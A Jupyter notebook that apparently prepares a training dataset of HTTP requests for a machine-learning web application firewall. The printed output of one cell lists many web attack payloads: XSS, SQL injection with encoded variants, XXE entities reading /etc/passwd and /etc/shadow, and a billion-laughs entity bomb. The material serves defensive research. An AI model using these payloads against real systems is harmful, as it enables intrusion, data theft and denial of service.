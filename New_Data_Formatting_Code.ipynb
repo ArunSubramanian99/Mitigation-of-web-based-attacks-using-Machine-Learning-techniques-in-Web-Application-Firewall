{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "New_Data_Formatting_Code.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "TjzU7UlN6nHM",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "import pandas as pd"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "7QzRR7We9CrP",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 124
        },
        "outputId": "87d0fc08-bb99-49fa-a226-508f959fb5c5"
      },
      "source": [
        "from google.colab import drive\n",
        "drive.mount('/d')\n"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Go to this URL in a browser: https://accounts.google.com/o/oauth2/auth?client_id=947318989803-6bn6qk8qdgf4n4g3pfee6491hc0brc4i.apps.googleusercontent.com&redirect_uri=urn%3aietf%3awg%3aoauth%3a2.0%3aoob&scope=email%20https%3a%2f%2fwww.googleapis.com%2fauth%2fdocs.test%20https%3a%2f%2fwww.googleapis.com%2fauth%2fdrive%20https%3a%2f%2fwww.googleapis.com%2fauth%2fdrive.photos.readonly%20https%3a%2f%2fwww.googleapis.com%2fauth%2fpeopleapi.readonly&response_type=code\n",
            "\n",
            "Enter your authorization code:\n",
            "··········\n",
            "Mounted at /d\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "JzlPKndP9ElJ",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "data = pd.read_csv(\"/d/My Drive/New_datasetML_Formatted.csv\")"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "1V9bX3Tz9m5q",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 156
        },
        "outputId": "72cc6ccd-67fa-4838-9a76-015ed9d58185"
      },
      "source": [
        "print(data.head(5))\n",
        "print(data.shape)\n",
        "print(type(data))"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "      Columns                                               Data\n",
            "0       Class                                             Attack\n",
            "1        POST                          /rest/user/login HTTP/1.1\n",
            "2        Host                                192.168.99.100:3000\n",
            "3  User-Agent   Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:...\n",
            "4      Accept                  application/json: text/plain: */*\n",
            "(992, 2)\n",
            "<class 'pandas.core.frame.DataFrame'>\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "xXHpjvOU9pby",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "outputId": "b0991c1a-6a65-425b-e97c-18a92f5b33c7"
      },
      "source": [
        "l = ['nan','Class','Host','User-Agent','Accept','Authorization','Accept-Language','Accept-Encoding','Content-Type','Content-Length','Origin','Connection','Referer','Cookie','GET','PUT','POST']\n",
        "for i,rows in data.iterrows():        \n",
        "    if str(rows['Columns']) not in l and str(rows['Data']) != '0':\n",
        "        rows['Columns'] = str(rows['Columns']) +\":\"+ str(rows['Data'])\n",
        "        rows['Data'] = str(0)\n",
        "        print(rows['Columns'])"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "email:<iframe src=\\\"javascript:alert(`xss`)\\\">:password:<iframe src=\\\"javascript:alert(`xss`)\\\">\n",
            "email:AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe:password:hdgcsld\n",
            "email:UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20:password:hdgcsld\n",
            "email:@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6\n",
            " UNION SELECT \n",
            "password:hdgcsld\n",
            "email:UNION SELECT @@VERSION,SLEEP(5),USER(),4# \n",
            "password:hdgcsld\n",
            "email:@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n",
            " UNION ALL SELECT\n",
            "password:hdgcsld\n",
            "email:@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- \n",
            " UNION ALL SELECT\n",
            "password:hdgcsld\n",
            "email:UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14\n",
            "password:hdgcsld\n",
            "email:VU5JT04gQUxMIFNFTEVDVCAnSU5KJ3x8J0VDVCd8fCdYWFgnLDIsMyw0LDUsNiw3LDgsOSwxMCwxMSwxMiwxMywxNA==\n",
            "password:hdgcsld\n",
            "email:%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%27%49%4e%4a%27%7c%7c%27%45%43%54%27%7c%7c%27%58%58%58%27%2c%32%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34\n",
            "password:hdgcsld\n",
            "email:Aron1233@cit.com:password:\"81dc9bdb52d04dc20036dbd8313ed055\n",
            "passwordRepeat:A123456:securityQuestion:{\"id\":5:question\n",
            "email:admin\") or (\"1\"=\"1\"--:password:\"81dc9bdb52d04dc20036dbd8313ed055\n",
            "passwordRepeat:A123456:securityQuestion:{\"id\":5:question\n",
            "email:admin\") or (\"1\"=\"1\"--:password:\"81dc9bdb52d04dc20036dbd8313ed055\n",
            "passwordRepeat:1234 ' AND 1=0 UNION ALL SELECT 'admin', :securityQuestion:{\"id\":5:question\n",
            "email:\")) or ((\"x\"))=((\"x:password:\"81dc9bdb52d04dc20036dbd8313ed055\n",
            "passwordRepeat:1234 ' AND 1=0 UNION ALL SELECT 'admin', :securityQuestion:{\"id\":5:question\n",
            "If-None-Match: W/\"3085-XJ3g6surC5M4Vowi9nucHmTsQTg\"\n",
            "If-None-Match: W/\"3085-XJ3g6surC5M4Vowi9nucHmTsQTg\"\n",
            "If-None-Match: W/\"3085-XJ3g6surC5M4Vowi9nucHmTsQTg\"\n",
            "If-None-Match: W/\"3085-XJ3g6surC5M4Vowi9nucHmTsQTg\"\n",
            "If-None-Match: W/\"3085-XJ3g6surC5M4Vowi9nucHmTsQTg\"\n",
            "{\"email\":Bren123@cit.com:password:admin') or ('1'='1'--:passwordRepeat:admin') or ('1'='1'--\n",
            "If-None-Match: W/\"3085-XJ3g6surC5M4Vowi9nucHmTsQTg\"\n",
            "If-None-Match: W/\"3085-XJ3g6surC5M4Vowi9nucHmTsQTg\"\n",
            "If-None-Match: W/\"3085-XJ3g6surC5M4Vowi9nucHmTsQTg\"\n",
            "Upgrade-Insecure-Requests:1\n",
            "username=<img src='http://example.com/record.php?<input type=\"hidden\" name=\"anti_xsrf\" value=\"s74bogj63h\">\n",
            "email:&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;\n",
            "password:123456sc\n",
            "email:&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;\n",
            "password:</script><script >alert(document.cookie)</script>\n",
            "email:&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;\n",
            "password:</script><script >alert(document.cookie)</script>\n",
            "email:&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;\n",
            "password:</script><script >alert(document.cookie)</script>\n",
            "email:PC9zY3JpcHQ+PHNjcmlwdCA+YWxlcnQoZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg==\n",
            "password:</script><script >alert(document.cookie)</script>\n",
            "email:PC9zY3JpcHQ+PHNjcmlwdCA+YWxlcnQoZG9jdW1lbnQuY29va2llKTwvc2NyaXB0Pg==\n",
            "password:%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%20%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e\n",
            "email:<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n",
            "password:%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%20%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e\n",
            "email:<scr<script>ipt>alert(1)</scr</script>ipt><scr<script>ipt>alert(1)</scr</script>ipt>\n",
            "password:%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%20%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e\n",
            "email:<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n",
            "password:%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%20%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3c%2f%73%63%72%69%70%74%3e\n",
            "email:<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n",
            "password:<iframe/src=\"data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\">\n",
            "email:<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n",
            "password:<script ~~~>alert(0%0)</script ~~~>\n",
            "email:<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n",
            "password:<? echo('<SCR)';echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>\n",
            "email:<STYLE>BODY{-moz-binding:url(\"http://ha.ckers.org/xssmoz.xml#xss\")}</STYLE>\n",
            "password:PD8gZWNobygnPFNDUiknO2VjaG8oJ0lQVD5hbGVydCgiWFNTIik8L1NDUklQVD4nKTsgPz4=\n",
            "email:<script>+-+-1-+-+alert(1)</script>\n",
            "password:<script>+-+-1-+-+alert(1)</script>\n",
            "email:<? echo('<scr)'; echo('ipt>alert(\\\"XSS\\\")</script>'); ?>\n",
            "password:<script>+-+-1-+-+alert(1)</script>\n",
            "email:perl -e 'print \\\"<SCR\\0IPT>alert(\\\"XSS\\\")</SCR\\0IPT>\\\";' > out\n",
            "password:<script>+-+-1-+-+alert(1)</script>\n",
            "email:<? echo('<scr)'; echo('ipt>alert(\\\"XSS\\\")</script>'); ?>\n",
            "password:&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;\n",
            "ProductId:2<script \"a='>'\" SRC=\"http://www.securitycompass.com/xss.js\"></script>4\n",
            "BasketId:6\n",
            "quantity:1\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>\n",
            "ProductId:2<script \"a='>'\" SRC=\"http://www.securitycompass.com/xss.js\"></script>4\n",
            "BasketId:6<IMG onmouseover=\"alert('xxs')\">\n",
            "quantity:1\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>\n",
            "ProductId:2<script \"a='>'\" SRC=\"http://www.securitycompass.com/xss.js\"></script>4\n",
            "BasketId:6\n",
            "quantity:1\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>\n",
            "UserId:18\n",
            "captcha:33\n",
            "comment:<!--?xml version=\\\"1.0\\\" ?-->\\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \\\"file:///etc/shadow\\\"> ]>\\n<userInfo>\\n <firstName>John</firstName>\\n <lastName>&ent;</lastName>\\n (***n1234@cit.com)\n",
            "rating:3\n",
            "UserId:18\n",
            "captcha:33\n",
            "comment:<!--?xml version=\"1.0\" ?-->\n",
            "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ELEMENT lolz (#PCDATA)>\n",
            "<!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;\n",
            "<!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n",
            "<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n",
            "<!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n",
            "<!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n",
            "<!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n",
            "<!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n",
            "<!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n",
            "<!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n",
            "<tag>&lol9;</tag>\"> ]>\\n<userInfo>\\n <firstName>John</firstName>\\n <lastName>&ent;</lastName>\\n (***n1234@cit.com)\n",
            "rating:3\n",
            "UserId:18\n",
            "captcha:33\n",
            "comment:<?xml version=\"1.0\"?>\n",
            "<!DOCTYPE foo [  \n",
            "<!ELEMENT foo (#ANY)>\n",
            "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>\"> ]>\\n<userInfo>\\n <firstName>John</firstName>\\n <lastName>&ent;</lastName>\\n (***n1234@cit.com)\n",
            "rating:3\n",
            "UserId:18\n",
            "captcha:33\n",
            "comment:<?xml version=\"1.0\"?>\n",
            "<!DOCTYPE foo [  \n",
            "<!ELEMENT foo (#ANY)>\n",
            "<!ENTITY xxe SYSTEM \"https://www.example.com/text.txt\">]><foo>&xxe;</foo>\"> ]>\\n<userInfo>\\n <firstName>John</firstName>\\n <lastName>&ent;</lastName>\\n (***n1234@cit.com)\n",
            "rating:3\n",
            "UserId:18\n",
            "captcha:33\n",
            "comment:<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>\"> ]>\\n<userInfo>\\n <firstName>John</firstName>\\n <lastName>&ent;</lastName>\\n (***n1234@cit.com)\n",
            "rating:3\n",
            "UserId:18\n",
            "captcha:33\n",
            "comment:<!--?xml version=\"1.0\" ?-->\n",
            "<userInfo>\n",
            " <firstName>John</firstName>\n",
            " <lastName>Doe</lastName>\n",
            "</userInfo>\"> %init; ]><foo/>\"> ]>\\n<userInfo>\\n <firstName>John</firstName>\\n <lastName>&ent;</lastName>\\n (***n1234@cit.com)\n",
            "rating:3\n",
            "UserId:18\n",
            "captcha:33\n",
            "comment:PCEtLT94bWwgdmVyc2lvbj0iMS4wIiA/LS0+Cjx1c2VySW5mbz4KIDxmaXJzdE5hbWU+Sm9objwvZmlyc3ROYW1lPgogPGxhc3ROYW1lPkRvZTwvbGFzdE5hbWU+CjwvdXNlckluZm8+Ij4gJWluaXQ7IF0+PGZvby8+\"> ]>\\n<userInfo>\\n <firstName>John</firstName>\\n <lastName>&ent;</lastName>\\n (***n1234@cit.com)\n",
            "rating:3\n",
            "UserId:18\n",
            "captcha:33\n",
            "comment:&#x3c;&#x21;&#x2d;&#x2d;&#x3f;&#x78;&#x6d;&#x6c;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x30;&#x22;&#x20;&#x3f;&#x2d;&#x2d;&#x3e;&#x0a;&#x3c;&#x75;&#x73;&#x65;&#x72;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x0a;&#x20;&#x3c;&#x66;&#x69;&#x72;&#x73;&#x74;&#x4e;&#x61;&#x6d;&#x65;&#x3e;&#x4a;&#x6f;&#x68;&#x6e;&#x3c;&#x2f;&#x66;&#x69;&#x72;&#x73;&#x74;&#x4e;&#x61;&#x6d;&#x65;&#x3e;&#x0a;&#x20;&#x3c;&#x6c;&#x61;&#x73;&#x74;&#x4e;&#x61;&#x6d;&#x65;&#x3e;&#x44;&#x6f;&#x65;&#x3c;&#x2f;&#x6c;&#x61;&#x73;&#x74;&#x4e;&#x61;&#x6d;&#x65;&#x3e;&#x0a;&#x3c;&#x2f;&#x75;&#x73;&#x65;&#x72;&#x49;&#x6e;&#x66;&#x6f;&#x3e;&#x22;&#x3e;&#x20;&#x25;&#x69;&#x6e;&#x69;&#x74;&#x3b;&#x20;&#x5d;&#x3e;&#x3c;&#x66;&#x6f;&#x6f;&#x2f;&#x3e;\"> ]>\\n<userInfo>\\n <firstName>John</firstName>\\n <lastName>&ent;</lastName>\\n (***n1234@cit.com)\n",
            "rating:3\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "SbKVxvAfC-Ql",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "outputId": "f8be7fb2-ee5d-4ca2-e867-feb6b15bb415"
      },
      "source": [
        "new_row ={}\n",
        "new_data = pd.DataFrame()\n",
        "for i,rows in data.iterrows():\n",
        "    new_row[rows['Columns']] = rows['Data']\n",
        "    if i < len(data)-1 and data.loc[i+1,'Columns'] == 'Class':\n",
        "        new_row[rows['Columns']] = rows['Data']\n",
        "        string = \"\"\n",
        "        if 'GET' in new_row.copy().keys():\n",
        "            for key,value in new_row.copy().items():\n",
        "                if value == '0':\n",
        "                    del new_row[key]\n",
        "                 \n",
        "        if 'POST' in new_row.copy().keys():\n",
        "            for key,value in new_row.copy().items():\n",
        "                if value == '0':\n",
        "                    string += str(key)\n",
        "                    del new_row[key]\n",
        "            new_row['POST Body'] = string\n",
        "            \n",
        "        if 'PUT' in new_row.copy().keys():\n",
        "            for key,value in new_row.copy().items():\n",
        "                if value == '0':\n",
        "                    string += str(key)\n",
        "                    del new_row[key]\n",
        "            new_row['PUT Body'] = string\n",
        "        print(i)\n",
        "        new_data = new_data.append(new_row, ignore_index = True)\n",
        "        new_row = {}\n",
        "        continue\n",
        "    "
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "15\n",
            "31\n",
            "47\n",
            "64\n",
            "81\n",
            "98\n",
            "115\n",
            "132\n",
            "149\n",
            "166\n",
            "183\n",
            "200\n",
            "217\n",
            "234\n",
            "247\n",
            "259\n",
            "271\n",
            "283\n",
            "295\n",
            "311\n",
            "323\n",
            "335\n",
            "348\n",
            "365\n",
            "379\n",
            "391\n",
            "403\n",
            "416\n",
            "429\n",
            "441\n",
            "453\n",
            "471\n",
            "489\n",
            "506\n",
            "524\n",
            "542\n",
            "559\n",
            "576\n",
            "593\n",
            "610\n",
            "627\n",
            "644\n",
            "662\n",
            "680\n",
            "698\n",
            "717\n",
            "735\n",
            "752\n",
            "774\n",
            "794\n",
            "813\n",
            "835\n",
            "857\n",
            "879\n",
            "901\n",
            "923\n",
            "946\n",
            "971\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "03_zD2ZFEjvu",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "10de20ba-f48a-4792-a2bd-938dd4ce121f"
      },
      "source": [
        "print(len(data))"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "992\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "fD1foFSoDLBg",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 104
        },
        "outputId": "06d54bdd-555f-4b20-d624-b8211f75b654"
      },
      "source": [
        "print(new_data.head(2))"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "                               Accept Accept-Encoding  ...  GET Authorization\n",
            "0   application/json: text/plain: */*   gzip: deflate  ...  NaN           NaN\n",
            "1   application/json: text/plain: */*   gzip: deflate  ...  NaN           NaN\n",
            "\n",
            "[2 rows x 16 columns]\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "du2nPPXRFBdJ",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "new_data.to_csv(\"New_Data_fully_formatted.csv\")"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}